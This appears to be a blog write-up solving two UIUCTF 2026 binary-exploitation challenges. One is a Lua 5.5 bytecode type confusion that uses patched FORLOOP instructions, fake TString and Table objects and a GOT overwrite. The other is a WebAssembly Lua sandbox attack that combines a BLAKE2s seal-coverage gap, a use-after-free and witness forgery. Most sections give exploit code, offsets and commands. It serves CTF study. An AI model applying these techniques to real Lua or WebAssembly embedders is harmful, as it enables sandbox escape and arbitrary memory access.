---
title: "UIUCTF 2026 Binary Exploitation Writeup: Firefly Complete Combustion + Sparxie Vanishing Encore"
slug: "uiuctf-2026-pwn-writeup"
description: "Complete UIUCTF 2026 Binary Exploitation writeup covering both pwn challenges. Firefly: Complete Combustion — Lua 5.5.0 bytecode-only sandbox with load / loadfile / dofile removed; stock luai_verifycode is empty so a valid luac output can be patched; OP_FORLOOP updates R[A] and R[A+2] via chgivalue which mutates payload but preserves tag, giving a payload-arithmetic type-confusion primitive; three patched FORLOOPs turn a long string into a fake TString view (arbitrary read), a real table into a fake Table with a rewritten array pointer (arbitrary write), and light-C-function print into hidden loadfile (delta 0xbb0 = luaB_loadfile - luaB_print); redirect fclose@GOT to fflush under partial RELRO so /flag.txt's stdio buffer survives the parser rejection, groom 39x64KiB retained strings, scan the buffer for uiuctf%b{}. Sparxie: Vanishing Encore — WebAssembly (Emscripten) moderation client accepting SPX2 cartridges of Lua source; two independent bugs — the archive Spotlight Pass BLAKE2s seal covers header[8:16] and body[0:28] but NOT the 16-byte route field, so an archive pass converts to a valid relay permit with a forged route (relay authenticator checks only digest[0:6] against route[2:8] and digest[8:12] against route[12:16], both non-secret); and timeline groups clips by (studio, offset, length) storing one representative pointer, so two distinct (0, 4096) clips collapse into one relocation record and one clip is left pointing at a freed studio page which the queue immediately reuses — rewriting all 63 queue slot pointers to 0x1f720 (static draft-object pool), reading with lens:read finds the live draft by marker 0x31d8a6f2 and authority by 0x9e51c7a3, a Lua-implemented BLAKE2s reproduces the SPARXIE::ENCORE::PROOF witness, three writes populate proof/campaign/operation, draft:publish() calls sparxie_redeem() which returns the flag."
date: 2026-08-11T09:00:00Z
lastmod: 2026-08-11T09:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["UIUCTF 2026"]
tags:
  - "uiuctf"
  - "uiuctf 2026"
  - "uiuc ctf"
  - "ctf writeup"
  - "binary exploitation"
  - "pwn"
  - "firefly complete combustion"
  - "sparxie vanishing encore"
  - "lua sandbox escape"
  - "lua 5.5"
  - "lua bytecode"
  - "luai_verifycode"
  - "op_forloop"
  - "type confusion"
  - "tvalue tag"
  - "chgivalue"
  - "fake tstring"
  - "fake table"
  - "partial relro"
  - "got overwrite"
  - "fclose fflush"
  - "heap grooming"
  - "webassembly exploit"
  - "emscripten"
  - "spx2 cartridge"
  - "blake2s"
  - "use after free"
  - "duplicate clip"
  - "static page pool"
  - "queue lens"
  - "draft publish"
  - "sparxie_redeem"
  - "ctf 2026"
keywords:
  - "uiuctf 2026 pwn writeup"
  - "uiuctf 2026 binary exploitation writeup"
  - "uiuctf firefly complete combustion writeup"
  - "uiuctf sparxie vanishing encore writeup"
  - "lua 5.5 bytecode sandbox escape ctf"
  - "op_forloop type confusion payload arithmetic lua"
  - "luai_verifycode empty stock lua exploit"
  - "chgivalue tag preservation type confusion"
  - "fake tstring arbitrary read lua ctf"
  - "fake table arbitrary write lua ctf"
  - "fclose got overwrite fflush stdio buffer retention"
  - "hidden loadfile luaB_loadfile pointer arithmetic"
  - "webassembly emscripten sandbox escape ctf"
  - "blake2s route coverage gap spx2 pass ctf"
  - "duplicate clip relocation use after free"
  - "queue slot pointer rewrite lens draft pool ctf"
  - "sparxie encore proof blake2s witness forgery"
  - "uiuctf 2026 solutions"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/uiuctf-2026-pwn-writeup.png"
  alt: "UIUCTF 2026 Binary Exploitation writeup cover — both pwn challenges solved. Firefly Complete Combustion is a Lua 5.5.0 bytecode-only sandbox where load, loadfile, and dofile are removed but the stock luai_verifycode hook is empty; a valid luac output is patched so OP_FORLOOP runs three times, each time calling chgivalue which mutates the payload of the third register but preserves its type tag, turning a real long string into a fake TString for arbitrary read, a real table into a fake Table with a rewritten array pointer for arbitrary write, and the print light-C function into hidden luaB_loadfile at delta 0xbb0; the fclose entry in the GOT is redirected to fflush under partial RELRO so the stdio buffer of the flag file survives the Lua parser rejection, 39 retained 64 KiB strings groom the heap, and string.match with uiuctf balanced-brace pattern extracts the flag. Sparxie Vanishing Encore is a WebAssembly moderation client accepting SPX2 cartridges; the archive Spotlight Pass BLAKE2s seal covers only 36 bytes of header and body but not the 16-byte route field, so the archive pass converts to a valid relay permit by forging the route; timeline groups clips by studio owner plus offset plus length storing one representative pointer, so two distinct clips at offset zero length 4096 collapse and leave one stale over a freed studio page which the queue immediately reuses; rewriting all 63 queue slot pointers to the static draft-object pool at 0x1f720 gives a lens over the pool, a Lua-implemented BLAKE2s reproduces the ENCORE PROOF witness, and draft publish calls sparxie_redeem to print the flag"
---

**UIUCTF 2026**'s Binary Exploitation track is two Hard-difficulty Lua sandbox escapes, and they teach the same lesson from opposite ends of the stack. Firefly: Complete Combustion runs stock Lua 5.5.0 as a native x86-64 process, accepts precompiled bytecode only, and removes every source-loading primitive — but the stock `luai_verifycode` hook is empty, so an attacker can compile a program with the challenge's own `luac` and then edit individual instructions. Sparxie: Vanishing Encore runs its moderation client as a WebAssembly module under Emscripten, accepts a Lua source cartridge wrapped in an SPX2 container, and hands off to custom native objects for permits, studios, clips, timelines, drafts, and queues — every one of which validates its own inputs. In both cases the intended path is not a stack overflow, a format string, or an integer bug. It is a **mismatch between what the integrity layer covers and what the runtime assumes**.

Firefly's `OP_FORLOOP` reads `R[A]` and `R[A+2]` without checking their tags and updates them via `chgivalue`, which mutates the *payload* but preserves the *tag*. Three malformed FORLOOP instructions turn a long string into an arbitrary-address `TString` view, a real table into an arbitrary-write `Table`, and the light C function `print` into the still-linked-but-removed `loadfile`. Redirecting `fclose@GOT` to libc's `fflush` under partial RELRO keeps the `/flag.txt` stdio buffer alive after Lua's parser rejects the flag as invalid source, and a groomed heap scan with `uiuctf%b{}` extracts the flag. Sparxie's archive Spotlight Pass BLAKE2s seal covers `header[8:16] || body[0:28]` but **does not cover the 16-byte route field** — so the same archive pass converts into a valid relay permit with a forged route. Combined with a duplicate-clip relocation that leaves one clip pointing at a freed studio page (immediately reused by the queue), it grants a full lens over the static draft-object pool, a Lua-implemented BLAKE2s witness forgery, and a call into the WebAssembly host's `sparxie_redeem` — which prints the flag.

Handouts, exploit scripts, ready-to-send payloads, and dependency-conscious solvers live at [Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026). This **CyberSecurity Elite** UIUCTF 2026 Binary Exploitation writeup covers both challenges end to end, with an emphasis on the *unchecked invariant* that each exploit exploits and on the *primitive-building* techniques (payload-arithmetic type confusion, freed-page reuse, GOT redirection for stdio-buffer retention, Lua-in-Lua BLAKE2s) that turn the initial primitive into a flag read. Read alongside the paired [UIUCTF 2026 Reverse Engineering writeup](/ctf-writeups/uiuctf-2026-reverse-engineering-writeup/), [UIUCTF 2026 Cryptography writeup](/ctf-writeups/uiuctf-2026-crypto-writeup/), [UIUCTF 2026 Miscellaneous writeup](/ctf-writeups/uiuctf-2026-misc-writeup/), [UIUCTF 2026 OSINT writeup](/ctf-writeups/uiuctf-2026-osint-something-handmade-writeup/), and [UIUCTF 2026 Nabi AI web writeup](/ctf-writeups/uiuctf-2026-web-nabi-ai-writeup/).

## Both Binary Exploitation challenges at a glance

| Challenge | Points | Runtime | Unchecked invariant | Primitive chain | Flag |
|---|---:|---|---|---|---|
| [Firefly: Complete Combustion](#firefly-complete-combustionpayloadarithmetic-type-confusion-in-lua-55-bytecode) | 152 | Native Lua 5.5.0 (x86-64 PIE, NX + canary + partial RELRO) | `luai_verifycode` is stubbed → bytecode passes `luaL_loadbufferx` even if it violates register-type assumptions | Three patched `FORLOOP`s → fake `TString` (read) + fake `Table` (write) + retarget `print` → `loadfile`. `fclose@GOT` → `fflush` keeps `/flag.txt` stdio buffer alive | `uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}` |
| [Sparxie: Vanishing Encore](#sparxie-vanishing-encorewebassembly-freedpage-reuse-into-blake2s-forgery) | 201 | WebAssembly (Emscripten) moderation client, custom `sparxie` module | Archive-pass BLAKE2s seal covers `header[8:16] || body[0:28]` — **not** the 16-byte route field; timeline groups clips by `(studio, offset, length)` — **not** identity | Forge relay route from archive pass; two `(0, 4096)` clips → render → one stale over freed page reused by queue → rewrite all 63 slot pointers to static draft pool → Lua BLAKE2s witness → `draft:publish()` → `sparxie_redeem()` | `uiuctf{c0m3_w17h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}` |

Two challenges, two different runtimes (native and WebAssembly), one shared root cause: **the trust boundary is drawn around the wrong artifact**. Firefly trusts a validly serialized bytecode chunk without checking register-type invariants; Sparxie trusts a BLAKE2s seal that does not cover the field the router reads. In both cases the exploit fits into the exact gap between what is checked and what the runtime assumes.

---

## Firefly: Complete Combustion — payload-arithmetic type confusion in Lua 5.5 bytecode

> *Flag:* `uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}`
>
> *Author's hint:* "Elio's script never accounted for untrusted bytecode."

Firefly runs stock Lua 5.5.0 inside a small x86-64 PIE. Each TLS connection accepts one length-prefixed binary Lua chunk. The wrapper opens the base, coroutine, table, string, math, and UTF-8 libraries; then it removes `dofile`, `load`, and `loadfile` from the globals. Nothing about the wrapper is exploitable — the entire attack surface is the bytecode loader itself.

### Audit the wrapper

The service protocol is explicit in `main.c`:

```c
chunk_length = ((uint32_t)encoded_length[0] << 24) |
               ((uint32_t)encoded_length[1] << 16) |
               ((uint32_t)encoded_length[2] << 8) |
               (uint32_t)encoded_length[3];
if (chunk_length < 4 || chunk_length > MAX_CHUNK_SIZE)
  return EXIT_FAILURE;
```

It verifies the Lua signature and forces binary-only loading:

```c
if (memcmp(chunk, LUA_SIGNATURE, sizeof(LUA_SIGNATURE) - 1) != 0)
  return EXIT_FAILURE;

status = luaL_loadbufferx(L, (const char *)chunk, chunk_length,
                          "@complete-combustion", "b");
```

Then it removes the source-loading globals:

```c
remove_global(L, "dofile");
remove_global(L, "load");
remove_global(L, "loadfile");
```

Binary properties: stripped x86-64 PIE, NX, stack canary, **partial RELRO** — `.got.plt` is writable, which becomes the entire endgame once we have arbitrary write.

### The missing verifier

Lua's binary chunk loader (`lundump.c`) checks the chunk signature, Lua version, format, instruction sizes, and serialized object bounds. It does *not* verify that the loaded instruction stream obeys the register-type assumptions the VM makes at runtime. The verification hook is empty unless the embedder redefines it:

```c
#if !defined(luai_verifycode)
#define luai_verifycode(L,f)  /* empty */
#endif
```

The wrapper uses the stock implementation. So the pipeline is: compile a valid Lua program with the provided `luac`, patch individual instructions, and hand the result back. The loader accepts it because the *serialization* is still structurally valid; the loader has no opinion about *semantics*.

### The `OP_FORLOOP` primitive

Lua values are a payload plus a separate one-byte type tag:

```c
typedef union Value {
  struct GCObject *gc;
  void *p;
  lua_CFunction f;
  lua_Integer i;
  lua_Number n;
} Value;

typedef struct TValue {
  Value value_;
  lu_byte tt_;
} TValue;
```

The integer path in Lua 5.5.0's `OP_FORLOOP` handler:

```c
StkId ra = RA(i);
if (ttisinteger(s2v(ra + 1))) {
  lua_Unsigned count = l_castS2U(ivalue(s2v(ra)));
  if (count > 0) {
    lua_Integer step = ivalue(s2v(ra + 1));
    lua_Integer idx = ivalue(s2v(ra + 2));
    chgivalue(s2v(ra), l_castU2S(count - 1));
    idx = intop(+, idx, step);
    chgivalue(s2v(ra + 2), idx);
    pc -= GETARG_Bx(i);
  }
}
```

Two properties of this handler are the exploit:

1. **Only `R[A+1]` (the step) is type-checked.** `R[A]` and `R[A+2]` are read through the integer union member without checking their tags.
2. **`chgivalue` mutates the payload but preserves the tag.** So after the loop, `R[A+2]` still identifies as its original type but its payload is `original + step`.

The exploit therefore arranges three consecutive registers:

| Register | Role | Value |
| --- | --- | --- |
| `R[A]` | loop count | integer `1` |
| `R[A+1]` | step | signed pointer delta |
| `R[A+2]` | control | string, table, or light C function |

A forged `FORLOOP A 0` executes exactly one update (count decrements from 1 to 0 and the loop terminates), adds the delta to the raw payload of `R[A+2]`, preserves its original tag, and performs no backward jump (`Bx = 0`).

### Patching bytecode

The readable Lua source uses `count = 2` as a marker instruction:

```lua
local count = 1
local step = chosen_delta
local forged = original_value
count = 2                  -- patched to FORLOOP A, 0
```

After compilation, [`build_exploit.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/build_exploit.py) replaces each `LOADI A, 2` marker with a `FORLOOP A, 0`. Lua 5.5 instructions encode as:

```text
instruction = opcode | (A << 7) | (Bx << 15)
opcodes: OP_LOADI = 1, OP_FORLOOP = 73
```

The patcher finds exactly three markers, preserves the compiler's register allocation for everything else, and prepends the required 4-byte big-endian network length.

### Malformed loop 1 — fake `TString` for arbitrary read

A regular long string's x86-64 layout:

| Offset | Field | Size |
| ---: | --- | ---: |
| `0x00` | `next` | 8 |
| `0x08` | `tt / marked / extra / shrlen` | 4 |
| `0x0c` | `hash` | 4 |
| `0x10` | `lnglen` | 8 |
| `0x18` | `contents` | 8 |
| `0x20` | inline contents | variable |

Create a real long string whose first 32 inline bytes are a fake `TString` header:

```lua
local header = string.pack(
  "<JBBBBI4TJ",
  0,          -- next
  20,         -- LUA_VLNGSTR
  0,          -- marked
  0,          -- extra
  0xff,       -- shrlen = LSTRREG (-1)
  0,          -- hash
  length,
  address
) .. string.rep("A", 64)
```

Then patch a FORLOOP that adds `32` to the real string-object pointer. The tag remains "long string" but the pointer now addresses the fake header at offset `0x20`:

```lua
local count = 1
local step = 32
local forged = header
count = 2                  -- patched to FORLOOP A, 0
return forged
```

String consumers now trust the fake `lnglen` and `contents`. `string.unpack("<J", read_memory(address, 8))` reads any qword. GC is stopped at the beginning of the exploit so the collector does not try to traverse forged collectable objects.

### Leak PIE and libc

Lua 5.5's `string.format("%p", ...)` returns the raw pointer for a light C function via `lua_topointer`. That leaks `luaB_print` directly:

```lua
local print_address = pointer(print)
local pie_base = print_address - 0x25ad0
```

Once arbitrary read works, the resolved `puts` GOT entry leaks libc. `puts` has already run to print the banner:

```lua
local puts_address = string.unpack("<J", read_memory(pie_base + 0x3c038, 8))
local libc_base = puts_address - 0x87cc0
```

Relevant offsets in the shipped libc:

```text
puts@GOT       PIE  + 0x3c038
puts           libc + 0x87cc0
fclose@GOT     PIE  + 0x3c068
fflush         libc + 0x858d0
```

### Malformed loop 2 — fake `Table` for arbitrary write

Lua 5.5's `Table` header:

| Offset | Field |
| ---: | --- |
| `0x00` | `next` |
| `0x08` | `tt / marked / flags / lsizenode` |
| `0x0c` | `asize` |
| `0x10` | `array` |
| `0x18` | `node` |
| `0x20` | `metatable` |
| `0x28` | `gclist` |

Array values are stored *before* the `array` pointer, tags *after* it. For zero-based index `u`:

```c
#define getArrVal(t,k) ((t)->array - 1 - (k))
```

For Lua key `46` (`u = 45`), setting `fake_table.array = target_address + 46 * 8` makes `fake_table[46] = value` write eight bytes at `target_address`. The tag byte lands at `target_address + 417` — the exploit routes that to an unused byte in `.bss`.

The second FORLOOP redirects a real table pointer to the fake table header:

```lua
local seed = {}
local count = 1
local step = pointer(header) + 32 - pointer(seed)
local forged = seed
count = 2                  -- patched to FORLOOP A, 0
forged[46] = value
```

Now we have arbitrary 8-byte write anywhere in writable memory.

### Malformed loop 3 — retarget `print` to hidden `loadfile`

Base-library functions with no upvalues are stored as **light C functions** — the Lua value contains the actual function address, not a heap closure. So `print`'s value literally holds `luaB_print`. Removing the global `loadfile` does not remove its function body from the binary because `luaopen_base` referenced it while constructing the base library.

The offsets:

```text
luaB_print     PIE + 0x25ad0
luaB_loadfile  PIE + 0x26680
delta                0x00bb0
```

Third malformed loop:

```lua
local count = 1
local step = 0xbb0
local target = print
count = 2                  -- patched to FORLOOP A, 0

target("/flag.txt")        -- actually luaB_loadfile("/flag.txt")
```

A diagnostic version of this stage returned:

```text
/flag.txt:1: malformed number near '1_'
```

That proved the hidden loader was reached, and leaked the first characters `uiuctf{1_` — but it did not leak the full flag because a flag is not valid Lua source. To recover the raw bytes we need to keep the file's read buffer alive after the parser rejects it.

### Keep `/flag.txt` alive across the parser rejection

`luaL_loadfilex` closes the `FILE *` even on parse failure:

```c
status = lua_load(L, getF, &lf, lua_tostring(L, -1), mode);
readstatus = ferror(lf.f);
if (filename) fclose(lf.f);
```

`fclose` frees or reuses the stdio buffer, destroying the bytes we need. Because the binary is partial RELRO, we redirect `fclose@GOT` to libc's `fflush` before calling the hidden loader:

```lua
write_memory(pie_base + 0x3c068, libc_base + 0x858d0)
target("/flag.txt")
```

The call site still passes the `FILE *` in the correct first-argument register. `fflush(FILE *)` returns without closing or freeing, so the buffer stays in the heap.

### Heap grooming and flag extraction

Allocate a predictable heap window and let the stdio allocation land in it:

```lua
local heap_anchor = string.rep("H", 64)
local heap_address = pointer(heap_anchor)
local heap_padding = {}
for index = 1, 39 do
  heap_padding[index] = string.rep("P", 65536)
end
local heap_window = read_memory(heap_address, 0x280000)
```

`heap_window` is not a copy — it is the fake `TString` view, so a subsequent read observes the *current* heap contents. Extract the flag with Lua's balanced-pattern operator:

```lua
local trailing_mapping = string.rep("T", 65536)
local flag = string.match(heap_window, "uiuctf%b{}")
assert(flag, "flag was not found in the retained file buffer")
print(flag)
```

The final compiled chunk is about 1.5 KiB — well under the 64 KiB input limit.

### Run

Build the payload (Linux x86-64 or Docker):

```bash
./handout/ld-linux-x86-64.so.2 --library-path ./handout \
  ./handout/luac -o exploit.luac exploit.lua
python3 build_exploit.py
```

Send it:

```bash
python3 solve.py
```

Successful remote run:

```text
      FYREFLY TYPE-IV // COMPLETE COMBUSTION
  GLAMOTH IRON CAVALRY // LUA 5.5.0
  Elio's script is not the one loaded today.
send 4-byte big-endian length + Lua chunk:
uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}
combat script complete
```

### Takeaway

**A checked serialization is not a checked program.** Lua's binary loader validates *structure*, not *runtime type invariants*. The empty-stub `luai_verifycode` documents this explicitly — embedders that care are supposed to define it, and this one didn't. Once that gap exists, `OP_FORLOOP`'s untyped read of `R[A]` and `R[A+2]` plus `chgivalue`'s tag-preserving payload update give payload-arithmetic type confusion in three lines of Lua per primitive. The GOT trick (`fclose → fflush`) is a small technique with an outsized effect: without it the flag file is opened, read into a heap buffer, and freed before the exploit can look, and the whole read chain is wasted. With it, the flag survives long enough for one final `string.match`.

---

## Sparxie: Vanishing Encore — WebAssembly freed-page reuse into BLAKE2s forgery

> *Flag:* `uiuctf{c0m3_w17h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}`
>
> *Author's hint:* "Her production moderation client accepts creator cartridges."

Sparxie runs an Emscripten WebAssembly module (`sparxicle.wasm`) under Node.js. Each connection accepts one SPX2 cartridge containing encrypted Lua source. The Lua sandbox is aggressive — `dofile / load / loadfile / print / tostring / string.format` all removed — but the custom `sparxie` native module exposes several manually managed objects (permits, studios, clips, timelines, drafts, queues, lenses). Two of those objects have logic bugs that compose into a full escape to the WASM host's `sparxie_redeem` import, which reads and prints `/flag.txt`.

### The SPX2 cartridge and the sandbox

`main.c` reads a 32-byte header. If the magic is `SPX2LIVE`, it reads the length word at offset 8 and decrypts the payload:

| Offset | Size | Meaning |
| ---: | ---: | --- |
| `0x00` | 8 | `SPX2LIVE` |
| `0x08` | 4 | plaintext length |
| `0x0c` | 4 | nonce |
| `0x10` | 4 | plaintext checksum |
| `0x14` | 4 | header tag |
| `0x18` | 4 | lane count (`4`) |
| `0x1c` | 4 | encore tag |
| `0x20` | variable | encrypted Lua source |

The supplied `pack.py` produces a valid cartridge from any Lua source. No attack on the cartridge format is needed.

The unpacked chunk is loaded in text-only mode:

```c
status = luaL_loadbufferx(state, (const char *)chunk, chunk_len,
                          "@vanishing-encore", "t");
```

The sandbox opens base, coroutine, table, string, math, UTF-8; removes `dofile`, `load`, `loadfile`, `print`, `tostring`, `string.format`; and installs the custom `sparxie` module and a hidden authority object.

### The flag target

The JavaScript host provides `sparxie_redeem`:

```javascript
function _sparxie_redeem(noncePtr, nonceLen) {
  if (nonceLen !== 32)
    throw new Error("invalid backstage witness");

  const nonce = HEAPU8.slice(noncePtr, noncePtr + nonceLen);
  let flag = null;
  try {
    flag = require("fs").readFileSync("/flag.txt", "utf8").trim();
  } catch (_) {}
  if (!flag)
    throw new Error("backstage flag is unavailable");

  out("[Sparxie] The final encore reached backstage.");
  out(flag);
}
```

There is no need to escape Lua or WASM. The exploit only needs to satisfy the native checks in `draft:publish()` — which eventually calls this import with a 32-byte witness.

### The Spotlight Pass and the coverage gap

The supplied `spotlight.pass` is 92 bytes:

| Offset | Size | Meaning |
| ---: | ---: | --- |
| `0x00` | 8 | `SPXPASS!` |
| `0x08` | 4 | catalogue ID |
| `0x0c` | 4 | body length `28` |
| `0x10` | 16 | route |
| `0x20` | 28 | body |
| `0x3c` | 32 | BLAKE2s seal |

The original route is the archive route (`0x11` followed by 15 zero bytes). `spotlight_review()` accepts this as catalogue data — but the archive path returns the Lua boolean `true`, which cannot be handed to `studio:render()`. Only the *relay* path returns a native `Permit` userdata.

The archive seal is:

```c
BLAKE2s(
    "SPARXIE::CATALOGUE::ARCHIVE" ||
    header[8:16] ||
    body[0:28]
)
```

**The 16-byte route field at `header[16:32]` is absent from the seal.** The original body and supplied seal can therefore remain unchanged while the route is replaced.

### Forge the relay route

The relay route has its own truncated authenticator:

```c
BLAKE2s(
    "SPARXIE::CATALOGUE::RELAY" ||
    seal ||
    header[8:16] ||
    route[0:2] ||
    route[8:12]
)
```

`route_valid()` compares only digest bytes `0:6` with `route[2:8]` and digest bytes `8:12` with `route[12:16]`. All inputs to that BLAKE2s are non-secret — the exploit can compute the digest offline and produce a matching route.

Set the type and edition:

```text
route[0] = 0x27    # relay
route[1] = 0x05    # required edition
```

The relay migration prepends `route[8:16]` to the original 28-byte body and decodes with `string.unpack` schema `<!1s8I4I4I8`. The first field is an 8-byte length prefix. Set its low 32 bits to `12` via `route[8:12] = 0c 00 00 00`. The high 32 bits must hold relay digest bytes `8:12` — but the WASM target uses a 32-bit `size_t`, so Lua's `s8` decoder truncates and extracts exactly 12 body bytes.

For the supplied seal, the relay digest is:

```text
b9893afab0eda92da20585c314d7a686fc47cdb85e3b350eb88bcdd04e155af0
```

Producing the replacement route:

```text
27 05 b9 89 3a fa b0 ed 0c 00 00 00 a2 05 85 c3
```

Decoded policy:

```text
byte string length = 12
operation          = 0x6b13c4a9
quota              = 47
edition            = 0x5a31c89e72d40b6f
```

Its BLAKE2s policy digest matches the hard-coded `allowed_policy`. `sparxie.review(modified_pass)` returns a valid one-use permit. The modified 92-byte pass is embedded at the beginning of `exploit.lua`.

### The custom Lua API

Decompiling `sparxicle.wasm` and following `luaL_Reg` registration arrays recovers:

| Constructor / method | Effect |
| --- | --- |
| `sparxie.review(pass)` | validates a pass, returns a permit |
| `sparxie.studio()` | creates a studio backed by a 4096-byte page |
| `studio:clip(offset, length)` | clip view into the page |
| `sparxie.timeline({clips})` | validates and groups clips |
| `sparxie.draft()` | creates a protected draft record |
| `studio:render(timeline, permit)` | consumes the permit, relocates the studio page |
| `sparxie.queue(draft)` | creates a queue |
| `queue:lens()` | returns a checked 16 KiB read/write lens |
| `lens:read / lens:write` | access the lens backing pointer |
| `draft:publish()` | validates the draft, calls `sparxie_redeem` |

Expected happy path:

```lua
local permit = sparxie.review(pass)
local studio = sparxie.studio()
local clip = studio:clip(0, 1)
local timeline = sparxie.timeline({clip})
local draft = sparxie.draft()
studio:render(timeline, permit)
local queue = sparxie.queue(draft)
local lens = queue:lens()
draft:publish()
```

The remaining task: change the protected draft *without* invalidating its userdata cookie.

### The shared page pool

Studios and queues draw from the same static free list at WASM linear-memory offset `0x7650`; each entry is 4104 bytes (4096 usable + allocator metadata).

Studio and clip structures:

```c
struct Studio {
    uint8_t *page;
    uint32_t clip_count;
    uint32_t generation;
};

struct Clip {
    Studio *owner;
    uint8_t *data;
    uint32_t offset;
    uint32_t length;
    uint32_t generation;
    uint32_t active;
};
```

During `studio:render()`, the client allocates a new page, copies all 4096 bytes, updates the studio pointer and generation, **repairs the timeline's clip records**, and returns the old page to the head of the shared free list. A subsequent `sparxie.queue(draft)` allocation deterministically reuses that page.

### The duplicate-clip relocation bug

Timeline construction correctly rejects the same clip userdata appearing twice. It does **not** reject two *distinct* clip objects with identical `(offset, length)`. The relocation bookkeeping groups clips by:

```text
(studio owner, offset, length)
```

Only one representative pointer is stored per group. Render walks those groups rather than every original clip userdata — so two separate clips for `(0, 4096)` become one relocation entry, and only one receives the new page pointer:

```lua
local first = studio:clip(0, 4096)
local second = studio:clip(0, 4096)
local timeline = sparxie.timeline({second, first})
studio:render(timeline, permit)
```

After render:

- one clip points to the new studio page;
- **one clip still points to the freed page**;
- the next `sparxie.queue(draft)` allocation reuses that freed page.

The exploit does not depend on which clip became the representative — it writes through both. One write corrupts an unused new studio page, the other reaches the live queue metadata.

### Redirect the queue lens to the static draft pool

The queue page holds 63 records, each 64 bytes:

| Slot-relative offset | Size | Meaning |
| ---: | ---: | --- |
| `+0x08` | 4 | slot identity |
| `+0x0c` | 4 | slot cookie |
| `+0x10` | 4 | 16 KiB backing pointer |
| `+0x14` | 4 | backing size (`0x4000`) |

`queue:lens()` picks one of the 63 via randomized state. Rather than predict the index, rewrite the pointer in every record:

```lua
for i = 0, 62 do
    local slot_pointer = i * 64 + 16
    first:write(slot_pointer, "\x20\xf7\x01\x00")
    second:write(slot_pointer, "\x20\xf7\x01\x00")
end
```

`20 f7 01 00` is `0x1f720`, the start of the static 272-byte-per-record **draft-object pool**. It is 8-byte aligned and inside the lens validator's accepted range. Slot identities, cookies, and declared sizes are untouched. The resulting `lens` provides a legitimate bounded read/write over 16 KiB of static memory — enough to cover the entire draft pool and the installed authority record.

### Find live draft and authority by marker

Queue construction fills unused draft entries with decoys. The 32-bit markers at record offset `+260`:

| Object | Marker | Little-endian |
| --- | --- | --- |
| live draft | `0x31d8a6f2` | `f2 a6 d8 31` |
| authority | `0x9e51c7a3` | `a3 c7 51 9e` |
| decoy draft | `0x74b29c15` | `15 9c b2 74` |

```lua
local pool = lens:read(0, 16384)
local draft_marker = string.find(pool, "\xf2\xa6\xd8\x31", 1, true)
local target = draft_marker - 1 - 260

local authority_marker = string.find(pool, "\xa3\xc7\x51\x9e", 1, true)
local authority = authority_marker - 1 - 260
```

### Fields required by `draft:publish()`

| Draft-relative offset | Size | Required |
| ---: | ---: | --- |
| `+0x40` | 32 | runtime BLAKE2s witness |
| `+0x60` | 8 | campaign `0x5a31c89e72d40b6f` |
| `+0x68` | 4 | operation `0xb74e25c1` |
| `+0x6c` | 4 | receipt already in userdata |
| `+0x104` | 4 | draft marker `0x31d8a6f2` |

Writing through the record rather than forging the Lua userdata preserves the pointer-dependent userdata cookie.

### Reproduce the runtime witness in Lua

The exact BLAKE2s input for the witness:

```text
"SPARXIE::ENCORE::PROOF"       (22 bytes)
|| authority[0:32]
|| draft[0:64]
|| catalogue_seal              (32 bytes)
|| campaign                    (8 bytes, little-endian)
|| operation                   (4 bytes, little-endian)
|| receipt                     (4 bytes, little-endian)
```

The catalogue seal is constant and already present in the modified pass:

```text
c4dab9e27f93ba5c9ff1432230dcfb6871f33b31896065f7aaf435c44225cd98
```

Because the `string` library retains `pack`, `unpack`, `sub`, and `rep`, a compact BLAKE2s implementation runs entirely inside the Lua cartridge. Read the randomized values, compute the digest, do the three writes:

```lua
lens:write(target + 64, blake2s(proof))
lens:write(target + 96, campaign)
lens:write(target + 104, operation)
draft:publish()
```

`publish()` recomputes the same witness, accepts the record, and calls `sparxie_redeem()`. `/flag.txt` is printed.

### Exploit flow (recap)

1. Embed the archive pass with its forged relay route.
2. `sparxie.review()` returns a real permit.
3. Allocate two distinct `(0, 4096)` clips.
4. `render()` leaves one stale clip pointing at the freed page.
5. `sparxie.queue(draft)` allocates on that page.
6. Rewrite all 63 queue-slot pointers to `0x1f720` through both clips.
7. `queue:lens()` returns a lens over the static draft pool.
8. Locate the live draft and authority by their 4-byte markers.
9. Compute the runtime BLAKE2s witness in Lua.
10. Write proof / campaign / operation.
11. `draft:publish()` → `sparxie_redeem()` → flag.

Source is 4968 bytes; the packed cartridge is 5000 bytes — comfortably under both service limits.

### Run

```bash
python3 pack.py exploit.lua exploit.spx
python3 solve.py                # or: ncat --ssl sparxie-vanishing-encore.chal.uiuc.tf 1337 < exploit.spx
```

Successful remote run:

```text
+--------------------------------------------------+
|        SPARXICLE LIVE - VANISHING ENCORE         |
|            PARTY TILL THE WORLD ENDS!            |
+--------------------------------------------------+
[catalogue] one Spotlight Pass remains
[studio] upload one SPX2 creator cartridge:
[Sparxie] The final encore reached backstage.
uiuctf{c0m3_w17h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}
[analytics] backstage witness ef656c69
[studio] stream ended
```

### Takeaway

**A BLAKE2s seal is only as good as the bytes it covers.** The archive seal covers 8 bytes of the header and 28 bytes of the body — but not the 16-byte route field the router will read. Once that gap exists, an archive pass converts into a relay permit without touching the seal at all. The duplicate-clip UAF is the other half: the timeline check dedupes clip *identity* but not `(owner, offset, length)`, and the relocation walks the grouped set — so one clip's page pointer never gets updated, and the deterministic page reuse hands that clip a lens on live queue metadata. Both bugs are logic bugs disguised as engineering; both are invisible if you only read the *check* and not the *invariant that the check is supposed to establish*.

---

## Cross-cutting lessons from the UIUCTF 2026 Binary Exploitation set

Two challenges, two languages (native Lua, WebAssembly Lua), one repeated pattern — **the exploit lives in the gap between what is checked and what the runtime assumes**:

- **Firefly** checks that the bytecode chunk is *serially valid*; the VM assumes register-type invariants that the loader does not enforce. `OP_FORLOOP` reads `R[A+2]` without a tag check and updates it via `chgivalue`, which preserves the tag while changing the payload. That gap is the whole exploit.
